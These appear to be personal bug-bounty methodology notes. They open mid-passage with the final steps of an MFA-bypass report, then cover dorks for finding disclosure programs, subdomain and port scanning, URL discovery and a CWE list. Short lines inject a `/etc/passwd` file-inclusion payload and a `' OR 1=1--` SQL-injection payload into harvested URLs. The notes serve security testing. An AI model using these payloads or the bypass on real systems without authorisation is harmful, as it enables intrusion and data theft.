Do not enter the password instead open the following URL: "sso.target.com/v2/login/mfa". (As explained in the previous post there is a cookie misconfiguration where the application assigns a valid session cookie while submitting the email id. So, by accessing "sso.target.com/v2/login/mfa" after entering the email id the application will directly prompt for MFA code thus authentication is bypassed).
Now enter the code received on attacker's email id which was noted down in the initial steps.
The application will grant access to the victim's account.
There was no proper validation in place to match the cookie & mfa id hence any account could be accessed using¬†this¬†method.


## Tips:

methodology:
file:///C:/Users/andre/Desktop/mohammedsudancityRecon.txt.pdf

```
üí° Bug Bounty Hunters: Don't Dismiss Targets Too Quickly!
During recon, I came across a target that threw this error:

"Secure Connection Failed ‚Äì Peer using unsupported version of security protocol (SSL_ERROR_UNSUPPORTED_VERSION)"

At first, by being an beginner in game I myself assumed the target was inactive or dead. But here‚Äôs the catch: the target was active, just relying on an outdated TLS version (e.g., TLS 1.0 or TLS 1.1), which modern browsers like Firefox no longer support by default.

You can bypass this issue in Firefox by tweaking these settings:

1. Open about:config in your browser.
2. Adjust the following:
- security.tls.version.enable-deprecated ‚Üí true
- security.tls.version.min ‚Üí 1

After making these changes, I was able to access the site and discovered several critical vulnerabilities on the target!

‚ö† Reminder: Always revert these settings to their original values after testing to maintain browser security.

```


----

## Find VDPs  

#Find_VDPs

üåç Find All Public VDPs with a Simple Dork üí•
Hunt responsible disclosure programs worldwide in seconds

üïµÔ∏è Dork for Shodan/ZoomEye:
```bash
(body="/responsible-disclosure"  body="/.well-known/security.txt") && port="443"
```

üîé This will reveal sites with:

A Responsible Disclosure page Or a security.txt file (per RFC 9116)

üí° What You Get:
‚úÖ List of companies actively accepting vulnerability reports
‚úÖ Perfect targets for legal bug bounty hunting
‚úÖ Entry points into private bounty programs
‚úÖ Contact emails for reporting bugs (security@example.com)

üß† Why This Works:
üî∏ /.well-known/security.txt is a standardized VDP endpoint
üî∏ /responsible-disclosure is commonly used by companies not following RFC
üî∏ Both indicate the company welcomes security testing (within scope)

üõ† Pro Tip:
Use these tools for discovery:
`
‚ö°Ô∏è ZoomEye
```bash
zoomeye search '(body="/responsible-disclosure"  body="/.well-known/security.txt") && port="443"'
```

‚ö°Ô∏è Shodan CLI
```bash
shodan search '(http.html:"/responsible-disclosure" OR http.html:"/.well-known/security.txt") port:443'
```

# VDP (Vulnerability Disclosure Program)

> https://github.com/sushiwushi/bug-bounty-dorks/blob/master/dorks.txt

![[Pasted image 20250208002842.png]]

## The basic and general

```
vulnerability disclosure program -site:hackerone.com -site:bugcrowd.com -site:yeswehack.com -site:intigriti.com
```

## VDP with rewards (unique area)

```
vulnerability disclosure program "reward" -site:hackerone.com -site:bugcrowd.com -site:yeswehack.com -site:intigriti.com  
vulnerability disclosure program "bounty" -site:hackerone.com -site:bugcrowd.com -site:yeswehack.com -site:intigriti.com
```

üåê_Try to leverage the built-in Google search engine tools_

![](https://miro.medium.com/v2/resize:fit:875/0*ALrtvzM-QMTbWWuj.png)


![](https://miro.medium.com/v2/resize:fit:681/0*PoJYk6na7u2ywUKt.png)


![](https://miro.medium.com/v2/resize:fit:875/1*ju78z_a6F52MXRmdf2ydNw.png)


				That‚Äôs how we can find recent and latest programs.

```
site:*.in vulnerability disclosure program "reward" -site:hackerone.com -site:bugcrowd.com -site:yeswehack.com -site:intigriti.com
```

![](https://miro.medium.com/v2/resize:fit:875/1*gnfa3MTSyOo3VOCfkQy8-A.png)

That‚Äôs how we can find recent and latest programs.

## Country TLD (Top-level domain)

Find which countries have strict data protection laws and then filter accordingly!

![[Pasted image 20250102212553.png]]

> site:*.in vulnerability disclosure program "reward" -site:hackerone.com -site:bugcrowd.com -site:yeswehack.com -site:intigriti.com

## Reward currency

_Rupees_

```
vulnerability disclosure program "reward" "‚Çπ" -site:hackerone.com -site:bugcrowd.com -site:yeswehack.com -site:intigriti.com
```
_Dollars_

```
vulnerability disclosure program "reward" "$" -site:hackerone.com -site:bugcrowd.com -site:yeswehack.com -site:intigriti.com

```
_Euros_

```
vulnerability disclosure program "reward" "‚Ç¨" -site:hackerone.com -site:bugcrowd.com -site:yeswehack.com -site:intigriti.com
```

_Bitcoin_

```
vulnerability disclosure program "reward" "bitcoin" -site:hackerone.com -site:bugcrowd.com -site:yeswehack.com -site:intigriti.com
```

## Payment Method

_Paypal_

```
vulnerability disclosure program "reward" "paypal" -site:hackerone.com -site:bugcrowd.com -site:yeswehack.com -site:intigriti.com
```

_Wire Transfer_

```
vulnerability disclosure program "reward" "wire transfer" -site:hackerone.com -site:bugcrowd.com -site:yeswehack.com -site:intigriti.com
```

# 2Ô∏è‚É£ BBP (Bug Bounty Program)

Similarly replace ‚Äúvulnerability disclosure program‚Äù to ‚Äúbug bounty program‚Äù and same dorks like in VDP.

# 3Ô∏è‚É£ RDP (Responsible Disclosure Program)

Similarly replace ‚Äúvulnerability disclosure program‚Äù to ‚Äúresponsible program‚Äù and same dorks like in VDP.

# 4Ô∏è‚É£ Security txt Files

Use above dorks combined with advanced search operator

```
filetype:txt  
ext:txt
```

Few programs also mention their BBP or VDP policy through PDF documents as well

```
ext:pdf  
filetype:pdf
```
# 5Ô∏è‚É£ LinkedIn OSINT

You‚Äôll notice people sharing Hall of Fame screenshots on LinkedIn, but some don‚Äôt provide information about the website or program details. How can you find this information in such cases where unique words present?

![](https://miro.medium.com/v2/resize:fit:875/1*2d_yH_gG0--h9mh5s6Or9Q.png)

Forexample, in above screenshot I didn‚Äôt include the program details.

Let‚Äôs see how to find it in this case.

We need to make some dork combinations that have some unique keywords that will narrow down search results to only that endpoint.

So what is unique about this screenshot, well the combination of names are uniqueüòÇ Let‚Äôs see how:

![](https://miro.medium.com/v2/resize:fit:875/1*JzUIUwEumnhHE-PsvmWPdQ.png)

"Check out our Vulnerability Disclosure Program for details on becoming featured on our Hall of Fame."

![](https://miro.medium.com/v2/resize:fit:875/1*laqVvz090tH4ZHIi05e3-A.png)

Google Dorking with some well known words that might be used by bug hunters when they post Hall of Fame results

> site:linkedin.com "Thrilled" "bug" "Hall of Fame" "swag"

# 6Ô∏è‚É£ Scope Hunting

This is the scope I like üòà

```
"bug bounty program" "all publicly accessible" -site:bugcrowd.com -site:hackerone.com -site:intigriti.com -site:yeswehack.com
```

![](https://miro.medium.com/v2/resize:fit:875/1*UirwIhF_UOSamkrdpH-wkg.png)


```
"vulnerability disclosure" "all internet facing assets" -site:yeswehack.com -site:hackerone.com -site:bugcrowd.com -site:intigriti.com
```
![](https://miro.medium.com/v2/resize:fit:875/1*SkUlMx3LmLUrtlk-a_iVXA.png)

```
vulnerability disclosure program "all subdomains"  -"not listed" -site:hackerone.com -site:bugcrowd.com -site:yeswehack.com -site:intigriti.com
```

![](https://miro.medium.com/v2/resize:fit:875/1*9lXWsS1WxbBKX-T7vIlvyQ.png)

# 7Ô∏è‚É£ Native Language

![](https://miro.medium.com/v2/resize:fit:875/1*76JilczRKMnmcQWZIZtKrw.png)

```
"bug bounty programma"  
"bug bounty programma" "beloning"  
"bug bounty programma" "‚Ç¨"
```

![](https://miro.medium.com/v2/resize:fit:875/1*9M3B-1eR3bPPAax5xEcZtw.png)


# 8Ô∏è‚É£ Use other search engines

Bing, yahoo, duckduckgo, yandex, etc..

For each search engine, the dorking operators might be different which you need to learn from its official docs if available.

# 9Ô∏è‚É£ _Swags or Goodies_

Combine above dorks with keywords like

```
"swag"  
"t-shirt"  
"tshirt"  
"goodies"  
"certificate"  
"letter of"
```

In the starting days, this might help to boost your resume/CV/portfolio.

## Find Programs by other people Hall of Fames

![](https://miro.medium.com/v2/resize:fit:875/1*vhqyIdvBjkeAQ4--H8JNSA.png)

						Credit: LinkedIn

```
"Parth Narula" "Hall of fame" -site:linkedin.com -site:instagram.com -site:github.com -site:x.com -site:twitter.com -site:facebook.com
```

![](https://miro.medium.com/v2/resize:fit:875/1*vaeweCmVXNaQXDpzM-wBhA.png)

```
"Parth Narula" "acknowledgement" -site:linkedin.com -site:instagram.com -site:github.com -site:x.com -site:twitter.com -site:facebook.com
```

![](https://miro.medium.com/v2/resize:fit:875/1*tpABPxq8X9-HQLeGxk3SWw.png)

```
"Parth Narula" "wall of fame" -site:linkedin.com -site:instagram.com -site:github.com -site:x.com -site:twitter.com -site:facebook.com
```

![](https://miro.medium.com/v2/resize:fit:875/1*CnsR1x1fjWZkPQaeLl0wvg.png)

Do bug hunting in such a way that people like me don‚Äôt search for programs but instead makes dork with your name to find the programs.üòé

---

# bug bounty methodology for beginners

![[Pasted image 20250207060705.png]]

![[Pasted image 20250207060715.png]]

![[Pasted image 20250207060849.png]]

## Google Dorking Methodology

_First of all, you should always start with some google dorking before doing actuall active/passive recon on  the target_

https://osintteam.blog/bug-hunting-recon-methodology-part2-legionhunter-4bb925e3e1bf & part 1.

## Install Tools:

the script  ensures  all the tools are placed in `/usr/bin/` for global access:

```Bash
#!/bin/bash

# Step 1: Install Katana
go install github.com/projectdiscovery/katana/cmd/katana@latest

# Step 2: Change directory to go/bin
cd ~/go/bin

# Step 3: Copy katana to /usr/bin
sudo cp katana /usr/bin/

# Confirm Katana installation
katana -version

# Install other tools and move to /usr/bin/
# Update package lists
sudo apt update

# Install ParamSpider
pip3 install paramspider
sudo cp ~/.local/bin/paramspider /usr/bin/

# Install waybackurls
go install github.com/tomnomnom/waybackurls@latest
sudo cp ~/go/bin/waybackurls /usr/bin/

# Install gauplus
go install github.com/bp0lr/gauplus@latest
sudo cp ~/go/bin/gauplus /usr/bin/

# Install hakrawler
go install github.com/hakluke/hakrawler@latest
sudo cp ~/go/bin/hakrawler /usr/bin/

# Install httpx
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
sudo cp ~/go/bin/httpx /usr/bin/

# Install uro
pip3 install uro
sudo cp ~/.local/bin/uro /usr/bin/

```

Save this script as `install_tools.sh`, give it execution permissions using `chmod +x install_tools.sh`, and then run it with `./install_tools.sh`.

This script will ensure that all the tools (Katana, ParamSpider, waybackurls, gauplus, hakrawler, httpx, and uro) are installed and copied to `/usr/bin/` for global access. Let me know if you need any further adjustments!

Methodology 2 recon: 


https://raw.githubusercontent.com/aungsanoo-usa/Bug-Hunting-methodology/refs/heads/main/Bug-Hunting-methodology.txt


--put it at the end of method?
[video example(if not deleted)](https://www.youtube.com/watch?v=8NwKfDs_mmw)

Tool download: [Gxss](https://medium.com/@sherlock297/install-gxss-on-kali-linux-b598e30e8be5) & [kxss](https://medium.com/@sherlock297/install-kxss-on-kali-linux-e0edd5d169af)


#### 2Ô∏è‚É£ Katana

If you observe the waymore output, sometimes it turns out to be around 1 crore URLs for large scope targets, and simply I can't wait for `Katana` for this, although there is a high possibility to find fresh URLs.

- **Basic Usage**: `katana -u target-domain.com`
    
- **List Targets**: `katana -list targets.txt`
    
- **Resume Scan**: `katana -resume resume.cfg`
    
- **Exclude Hosts**: `katana -e cdn,private-ips`
    
- **Depth of Crawl**: `katana -d 6`
    
- **Crawl Duration**: `katana -ct 1h`
    
- **Enable JS Crawl**: `katana -jc`
    
- **Enable JSLuice Parsing**: `katana -jsluice`
    
- **Crawl Known Files**: `katana -kf all`
    
- **Form Extraction**: `katana -fx`
    
- **XHR Crawling**: `katana -xhr`
    
- **Automatic Form Fill**: `katana -aff`
    
- **Ignore Query Params**: `katana -iqp`
    
- **Disable Redirects**: `katana -dr`
    
- **Custom Headers**: `katana -H "header:value"`
    
- **Proxy Usage**: `katana -proxy http://proxy.com`
    
- **Form Configuration**: `katana -fc form-config.json`
    
- **Field Configuration**: `katana -flc field-config.json`
    
- **Visit Strategy**: `katana -s breadth-first`
    
- **TLS Impersonation**: `katana -tlsi`

#### 3Ô∏è‚É£ Burpsuite Crawling

<iframe width="720" height="150" src="https://www.youtube.com/embed/mI7fj5fdsB0" title="How to crawl a web application (with Burp Suite Community Edition)" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
#### 4Ô∏è‚É£ Google Dorking

- This is the area that I spend most of my time in cyberspace :)
- Less likely to get duplicates compared to others although it's not prone to dup.
- Infinite dorks are possible.

In general, hunters use dorks like:

```
site:redacted.com inurl:search=
site:redacted.com inurl:page=
site:redacted.com inurl:query=
site:redacted.com inurl:lang=
site:redacted.com inurl:q=
site:redacted.com inurl:s=
```

The reason behind the infinite

```css
site:domain.com inurl:{keyword} inurl:&
site:domain.com inurl:{keyword} inurl:=
site:domain.com inurl:{keyword} inurl:?
site:domain.com inurl:{keyword} inurl:& inurl:= inurl:?
```

`Keyword` **can be anything** ranging from English words, file extensions, numbers, usernames, and specific keywords related to a particular CMS endpoint, it can be words of any Language other than English.

- It can't be easily automated because **you need to bypass the Google captcha first,** which is quite hectic if you make a script to automate it, and Google interrupts using it and simply we don't have time to solve those captchas manually. Some top automation hunters might have cracked it already, but they won't make it public. ~={yellow}And the publicly available other dork engines are good, but again because everyone uses it, I don't use it :)=~

#### üìçAnother hidden mistake by beginners

They will use `gf` tools and with the `gf-patterns` mentioned below:

#gf

**üö®It may not be considered a mistake by others, but it's my own perspective and experience about it.**

Let me explain to you what I want to say clearly, closely observe the `xss.json` file that is included in `Gf-Patterns`

![None](https://miro.medium.com/v2/resize:fit:700/1*wwIWz0rgpztHAopE08_ZLA.png)

		Credit: [github.com](https://github.com/1ndianl33t/Gf-Patterns/) (1ndianl33t ‚Äî GfPatterns)

Spend 2 minutes, what came to your mind?

Okay no problem, now ask yourself this question, "**Only these parameters are vulnerable to XSS or what?**"

Now what I did in the automation is that I collected the archived URLs via `waymore`, and instead of matching for these using `gf` tool, I removed those URLs that contain these parameters, and that's how I remove duplicates even in automation üòà

> This is not to disrespect the developer, but a silly question by a script kiddie

![None](https://miro.medium.com/v2/resize:fit:700/1*kZsTWbqNppSENQzhEBmXmA.png)


If you want to see this X post, use this google dork

```
site:x.com "Ever had to quickly check" "Gf"
```

---

## Subdomain Recon

#subdomain_collections

source: https://freedium.cfd/https://infosecwriteups.com/how-to-uncover-hidden-attack-surfaces-recon-part-6-61e43976ed22

### 1. Probing: Filtering Live Services

Subdomains ‚â† live hosts. The following steps help removing dead assets and focus on real attack surfaces.

### HTTP/S Probing

#### How it Helps:

- Identifies live web services from a list of subdomains.
- Filters out inactive domains, reducing unnecessary scans.
- Provides useful metadata like response status codes, titles, and technology stack.

#### Tool: httpx / httprobe

**Command:**

For just getting alive subdomains:

```bash
httpx -l subdomains.txt -o alive-subs.txt
```

For getting additional details:

```bash
cat subdomains.txt | httpx -title -status-code -tech-detect -o alive-subs.txt
```

#### Flags Explanation:

- `-title`: Extracts the webpage title for easy identification.
- `-status-code`: Displays HTTP response codes (e.g., 200, 403, 500).
- `-tech-detect`: Detects technologies used on the site (e.g., Apache, Nginx, WordPress).
- `-o alive-subs.txt`: Saves output to a file for further analysis.

**Advanced Usage:** For broad port scanning, use:

```bash
cat subdomains.txt | httpx -ports 80,443,8000-9000 -o alive-subs.txt
```

This extends scanning beyond default ports (80/443) to include 8000‚Äì9000 (common for admin panels, APIs, and staging sites).

### 2. IP Collection & Analysis

After identifying live hosts, mapping subdomains to IPs helps expand the attack surface.

### A. Resolve Subdomains to IPs

#### How it Helps:

- Converts subdomains to IPs for deeper analysis (e.g., shared hosting, ASN tracking).

#### Tool: massdns

**Command:**

You can search for best resolvers on assetsnotes or github repository.

```typescript
massdns -r resolvers.txt -o S -w ips.txt subdomains.txt
```

#### Flags Explanation:

- `-r resolvers.txt`: Specifies a list of resolvers for faster DNS lookups.
- `-o S`: Outputs in a simple format.
- `-w ips.txt`: Saves resolved IPs to a file.

### B. ASN Lookup

#### How it Helps:

- Identifies IP ranges owned by the target using Autonomous System Numbers (ASN).
- Helps locate additional infrastructure linked to the target.

#### Tool: whois / bgp.tools

**Command:**

```perl
whois -h whois.radb.net -- '-i origin AS12345' | grep -Eo "([0-9.]+){4}/[0-9]+"
```

#### Where to Replace:

`AS12345`: Replace with the target's ASN (found via tools like `bgpview.io`).

### C. Reverse DNS Lookups

#### How it Helps:

Identifies other domains sharing the same IP (useful for multi-tenant environments).

#### Tool: dnsrecon

**Command:**

```xml
dnsrecon -r <IP_RANGE> -n 8.8.8.8 -d target.com
```

#### Where to Replace:

- `<IP_RANGE>`: Replace with the target's known IP range (from ASN lookup).

### 3. Checking Non-HTTP Services

#### How it Helps:

- Identifies exposed services like databases, SSH, or RPC.
- Expands attack surface beyond web-based vulnerabilities.

#### Tool: nmap / masscan

**Command:**

```css
nmap -sV -p 21,22,6379,27017 -iL ips.txt
```

#### Flags Explanation:

- `-sV`: Detects service versions (useful for vulnerability identification).
- `-p 21,22,6379,27017`: Scans FTP (21), SSH (22), Redis (6379), MongoDB (27017).
- `-iL ips.txt`: Reads input from a file containing live IPs.

### 4. Port Scanning

I will show you how you can perform port scanning on Live & Dead (according to httpx) subdomains. Why on Dead? Sometimes they might be a non-http assets & might also be an hidden or unprotected assets.

### A. Step-by-Step Approach to Separate Non-Alive Subdomains:

#### Step 1: Identify Non-Alive Subdomains

Compare the original subdomain list with the live subdomains list.

```bash
comm -23 <(sort subdomains.txt) <(sort alive-subs.txt) > non-alive-subs.txt
```

This extracts subdomains that did not respond.

#### Step 2: Revalidate Non-Alive Subdomains

Sometimes, subdomains appear non-alive due to WAFs or rate-limiting. Test again using `dig` :

```bash
while read domain; do dig +short $domain; done < non-alive-subs.txt
```

If IPs resolve, the subdomain may be protected rather than down. **Save these IPs into a non-http.txt file or you can also add them to ip.txt file.**

#### Step 3: Save & Categorize Results

- `alive-subs.txt`: Active web services.
- `non-alive-subs.txt`: Unresponsive hosts (could be further probed for misconfigurations).
- `non-http.txt`: Subdomains resolving to IPs but without HTTP services.

### B. **Performing Port Scanning on Both Alive & Non-Alive Subdomains**

#### Port Scanning on Alive Subdomains

Since these subdomains host active services, scan for open ports to identify additional entry points.

```css
nmap -sV -p- -iL alive-subs.txt -oN alive-ports.txt
```

**Flags Explanation:**

- `-sV`: Detects service versions.
- `-p-`: Scans all 65,535 ports.
- `-iL alive-subs.txt`: Reads input from the live subdomains list.

#### Port Scanning on Non-Alive Subdomains

If a subdomain is unresponsive over HTTP/S, it might still have other open ports (SSH, FTP, etc.).

```css
nmap -Pn -sV -p- -iL non-alive-subs.txt -oN non-alive-ports.txt
```

**Flags Explanation:**

- `-Pn`: Skips host discovery (treats all hosts as online to test for open ports).
- `-sV`: Detects service versions.
- `-p-`: Scans all ports.
- `-iL non-alive-subs.txt`: Reads from the non-alive list.

#### Masscan for Fast Scanning

For large lists, `masscan` provides rapid port scanning.

```css
masscan -p1-65535 -iL subdomains.txt --rate 10000 -oX masscan_results.xml
```

**Note:** Adjust `--rate` to avoid triggering firewalls.

By separating subdomains based on their responsiveness and scanning all potential ports, you **uncover hidden attack surface** in bug bounty reconnaissance!

source: https://infosecwriteups.com/url-discovery-hunt-where-others-arent-hunting-recon-part-8-e0368b9aaf81

# URL Discovery: Tools & Tactics

## A. Passive Discovery (No Direct Interaction)

Passive methods avoid tripping WAFs/IPS and are ideal for stealthy reconnaissance.

## Tool: `gau` (Fetch URLs from AlienVault OTX & Common Crawl)

**Command**:

```bash
gau example.com -subs -threads 20 -o gau.txt
```

**Flags Explained**:

- `--subs`: Include subdomains (e.g., `dev.example.com`).
- `--threads`: Speed up by parallelizing requests.

**Why Use It**: Pulls historical data from public archives. Finds endpoints even if they‚Äôre no longer live.

## Tool: `waybackurls`

**Command**:

```bash
waybackurls example.com | tee wayback.txt
```

**Pro Tip**: Combine with `gau` for maximum coverage:

```bash
cat gau.txt wayback.txt | sort -u > combined_passive.txt
```

## B. Active Discovery (Direct Crawling)

Actively interact with the target to find URLs missed by passive methods.

## Tool: `katana` (Fast, Modern Crawler)

**Command**:

```bash
katana -u https://example.com -d 4 -jc -kf robotstxt -c 10 -o katana.txt

```
**Flags Explained**:

- `-d 4`: Crawl depth 4 (prevents infinite loops).
- `-jc`: Execute JavaScript (critical for SPAs).
- [Optional]: `-kf robotstxt`: Respect `robots.txt` (avoid blackhat vibes)`

**Why Use It**: Renders JS, handles forms, and mimics real user behavior.

## Tool: `gospider` (Recursive Spider)

**Command**:

```bash
gospider -s https://example.com -a -w -r -q -o gospider_out - threads 25
```

**Flags Explained**:

- `-a`: Include all HTTP methods (POST, PUT, etc.).
- `-w`: Crawl "about:blank " pages (common in JS-heavy apps).
- `-r`: Follow robots.txt (optional)

## C. Secret Tips for Maximum Coverage

**Auth Required?** Use `--cookie` or `--header` in tools like `katana` to crawl authenticated areas:

```bash
katana -u https://example.com/dashboard -H "Cookie: session=1234"
```

**SPA/JS Tricks**: Use `chromedp` in headless mode to dump dynamically rendered URLs:

```bash
echo https://example.com | hakrawler -js -depth 2 -scope subs -plain
```

# URL Filtering: Reduce the Noise

Raw URL lists are messy. Filter aggressively to focus on high-value targets.

## A. Static File Exclusion

Remove images, CSS, JS (unless you‚Äôre hunting for sourcemap leaks!):

```bash
cat urls.txt | grep -ivE "\.(png|jpeg|css|js|woff2|svg)(\?|$)" > filtered.txt
```

## B. Focus on High-Value Patterns

**API Routes**:

```bash
grep -iE "api|v1|v2|graphql|rest|json" filtered.txt
```

**Parameters**: Look for `?q=`, `id=`, `file=`, `redirect=`:

```bash
grep -iE "\?[a-z]+=" filtered.txt
```

**Sensitive File Extensions**:

```bash
grep -iE "\.(php|asp|aspx|jsp|bak|old|swp|sql)" filtered.txt
```

## C. Deduplication

Use `urldedupe` to remove redundant URLs and sort by parameters:

```bash
cat filtered.txt | urldedupe -s -u > deduped.txt
```

- `-s`: Sort output.
- `-u`: Keep unique URLs.

# Prioritization: What to Hack First?

Not all URLs are equal. Prioritize based on:

## A. Parameter Type

**Reflected Inputs**:

```bash
grep -iE "search|query|name=" deduped.txt
```

Ideal for XSS/Open Redirects.

**File Inclusion**:

```bash
grep -i "file=" deduped.txt | qsreplace "/etc/passwd"
```

**Auth Endpoints**: `/login`, `/oauth`, `/reset-password`.

## B. HTTP Methods

Prioritize `POST`/`PUT` over `GET` (more likely to alter data):

```bash
grep -E "POST|PUT" deduped.txt

```
## C. Pro Tips

**Numeric IDs**: URLs with `id=1234` are often vulnerable to IDOR:

```bash
grep -E "id=\d+" deduped.txt
```

**Long Parameters**: `?q=verylongstring` might indicate JWT or encrypted data.

**Debug Flags**: Look for `debug=true` or `test=1` in URLs.

# Automation & Workflow

**Sample Workflow**:

```bash
# Passive  
gau -subs example.com | tee gau.txt  
waybackurls example.com | tee wayback.txt  
  
# Active  
katana -u https://example.com -jc -d 3 -o katana.txt  
  
# Combine, filter, prioritize  
cat gau.txt wayback.txt katana.txt | sort -u | grep -ivE "\.(css|js)" | urldedupe > final.txt  
  
# Fuzz parameters  
cat final.txt | gf sqli | qsreplace "') OR 1=1--" | httpx -silent -status-code
```

# Final Checklist

- Combine passive + active sources.
- Filter out static files (unless intentional).
- Prioritize parameterized URLs.
- Check for misconfigurations (e.g., `[http://internal.example.com](http://internal.example.com\).)`[).](http://internal.example.com\).)
- Test for low-hanging fruit (XSS, Open Redirect, IDOR) first.

-----


#waymore-patterns
## finding subdomains based on patterns after subdomain recon:

![[Pasted image 20250104123326.png]]

									altdns


waybackurls + waymore for recon:

We use `waymore` instead of `waybackurls` due to its many different sources of collections and also don‚Äôt forget to provide the necessary API keys.

> waymore -i domain.com -mode U -oU waymore_output.txt

First, try to find whether any ports are present in the archived URLs or not

> cat waymore_output.txt | grep "com:"

Next, we remove the usual ports 80(http) & 443(https) and try to match other uncommon ports worth investigating further.

> cat waymore_output.txt | grep "com:" | grep -v ":80" | grep -v ":443"

Here I mentioned, `com` as an example, it can be any TLD(top-level domain) based on your target.

![](https://miro.medium.com/v2/resize:fit:875/1*W2Mhz_z1HiMJTLkuLc4Fsg.png)

							Linux PC Screenshot


## See if the targets is a VDP:

```
cat hackerone_urls.txt | grep "embedded_submission"  
cat hackerone_urls.txt | grep "embedded_submission" | grep "new$"
```

![](https://miro.medium.com/v2/resize:fit:875/1*bH6hYccR3rJA5RaRTEC1bw.png)

## 1Ô∏è‚É£ Scope Asset

Before you begin hunting, review the assets that are in scope.

``` Weakness Category
Allocation of Resources Without Limits or Throttling(CWE-770)  
Array Index Underflow(CWE-129)  
Authentication Bypass Using an Alternate Path or Channel(CWE-288)  
Improper Restriction of Authentication Attempts(CWE-307)  
Buffer Over-read(CWE-126)  
Buffer Underflow(CWE-124)  
Buffer Under-read(CWE-127)  
Business Logic Errors(CWE-840)  
Classic Buffer Overflow(CWE-120)  
Cleartext Storage of Sensitive Information(CWE-312)  
Cleartext Transmission of Sensitive Information(CWE-319)  
Client-Side Enforcement of Server-Side Security(CWE-602)  
Code Injection(CWE-94)  
Command Injection - Generic(CWE-77)  
Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')(CWE-362)  
CRLF Injection(CWE-93)  
Cross-Site Request Forgery (CSRF)(CWE-352)  
Cross-site Scripting (XSS) - DOM(CWE-79)  
Cross-site Scripting (XSS) - Generic(CWE-79)  
Cross-site Scripting (XSS) - Reflected(CWE-79)  
Cross-site Scripting (XSS) - Stored(CWE-79)  
Cryptographic Issues - Generic(CWE-310)  
Uncontrolled Resource Consumption(CWE-400)  
Deserialization of Untrusted Data(CWE-502)  
Double Free(CWE-415)  
Download of Code Without Integrity Check(CWE-494)  
Embedded Malicious Code(CWE-506)  
Execution with Unnecessary Privileges(CWE-250)  
Exposed Dangerous Method or Function(CWE-749)  
External Control of Critical State Data(CWE-642)  
Externally Controlled Reference to a Resource in Another Sphere(CWE-610)  
Failure to Sanitize Special Elements into a Different Plane (Special Element Injection)(CWE-75)  
File and Directory Information Exposure(CWE-538)  
Forced Browsing(CWE-425)  
Heap Overflow(CWE-122)  
HTTP Request Smuggling(CWE-444)  
HTTP Response Splitting(CWE-113)  
Improper Access Control - Generic(CWE-284)  
Improper Authentication - Generic(CWE-287)  
Improper Authorization(CWE-285)  
Improper Certificate Validation(CWE-295)  
Improper Check or Handling of Exceptional Conditions(CWE-703)  
Improper Export of Android Application Components(CWE-926)  
Improper Following of a Certificate's Chain of Trust(CWE-296)  
Improper Handling of Highly Compressed Data (Data Amplification)(CWE-409)  
Improper Handling of Insufficient Permissions or Privileges(CWE-280)  
Improper Handling of URL Encoding (Hex Encoding)(CWE-177)  
Improper Input Validation(CWE-20)  
Improper Neutralization of Escape, Meta, or Control Sequences(CWE-150)  
Improper Neutralization of HTTP Headers for Scripting Syntax(CWE-644)  
Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)(CWE-80)  
Improper Null Termination(CWE-170)  
Improper Privilege Management(CWE-269)  
Inadequate Encryption Strength(CWE-326)  
Inclusion of Functionality from Untrusted Control Sphere(CWE-829)  
Incomplete Blacklist(CWE-184)  
Incorrect Authorization(CWE-863)  
Incorrect Calculation of Buffer Size(CWE-131)  
Incorrect Comparison(CWE-697)  
Incorrect Permission Assignment for Critical Resource(CWE-732)  
Information Disclosure(CWE-200)  
Information Exposure Through an Error Message(CWE-209)  
Information Exposure Through Debug Information(CWE-215)  
Information Exposure Through Directory Listing(CWE-548)  
Information Exposure Through Discrepancy(CWE-203)  
Information Exposure Through Sent Data(CWE-201)  
Information Exposure Through Timing Discrepancy(CWE-208)  
Insecure Direct Object Reference (IDOR)(CWE-639)  
Insecure Storage of Sensitive Information(CWE-922)  
Insecure Temporary File(CWE-377)  
Insufficiently Protected Credentials(CWE-522)  
Insufficient Session Expiration(CWE-613)  
Integer Overflow(CWE-190)  
Integer Underflow(CWE-191)  
Key Exchange without Entity Authentication(CWE-322)  
LDAP Injection(CWE-90)  
Leftover Debug Code (Backdoor)(CWE-489)  
Malware(CAPEC-549)  
Man-in-the-Middle(CWE-300)  
Memory Corruption - Generic(CWE-119)  
Misconfiguration(CWE-16)  
Missing Authentication for Critical Function(CWE-306)  
Missing Authorization(CWE-862)  
Missing Encryption of Sensitive Data(CWE-311)  
Missing Required Cryptographic Step(CWE-325)  
Modification of Assumed-Immutable Data (MAID)(CWE-471)  
NULL Pointer Dereference(CWE-476)  
Off-by-one Error(CWE-193)  
Open Redirect(CWE-601)  
OS Command Injection(CWE-78)  
Out-of-bounds Read(CWE-125)  
Password in Configuration File(CWE-260)  
Path Traversal(CWE-22)  
Path Traversal: '.../...//'(CWE-35)  
Phishing(CAPEC-98)  
Plaintext Storage of a Password(CWE-256)  
Privacy Violation(CWE-359)  
Privilege Escalation(CAPEC-233)  
Relative Path Traversal(CWE-23)  
Reliance on Cookies without Validation and Integrity Checking in a Security Decision(CWE-784)  
Reliance on Reverse DNS Resolution for a Security-Critical Action(CWE-350)  
Reliance on Untrusted Inputs in a Security Decision(CWE-807)  
Remote File Inclusion(CWE-98)  
Replicating Malicious Code (Virus or Worm)(CWE-509)  
Resource Injection(CWE-99)  
Reusing a Nonce, Key Pair in Encryption(CWE-323)  
Reversible One-Way Hash(CWE-328)  
Security Through Obscurity(CWE-656)  
Server-Side Request Forgery (SSRF)(CWE-918)  
Session Fixation(CWE-384)  
SQL Injection(CWE-89)  
Stack Overflow(CWE-121)  
Storing Passwords in a Recoverable Format(CWE-257)  
Time-of-check Time-of-use (TOCTOU) Race Condition(CWE-367)  
Trust of System Event Data(CWE-360)  
Type Confusion(CWE-843)  
UI Redressing (Clickjacking)(CAPEC-103)  
Unchecked Error Condition(CWE-391)  
Uncontrolled Recursion(CWE-674)  
Unprotected Transport of Credentials(CWE-523)  
Unrestricted Upload of File with Dangerous Type(CWE-434)  
Untrusted Search Path(CWE-426)  
Unverified Password Change(CWE-620)  
Use After Free(CWE-416)  
Use of a Broken or Risky Cryptographic Algorithm(CWE-327)  
Use of a Key Past its Expiration Date(CWE-324)  
Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)(CWE-338)  
Use of Externally-Controlled Format String(CWE-134)  
Use of Hard-coded Credentials(CWE-798)  
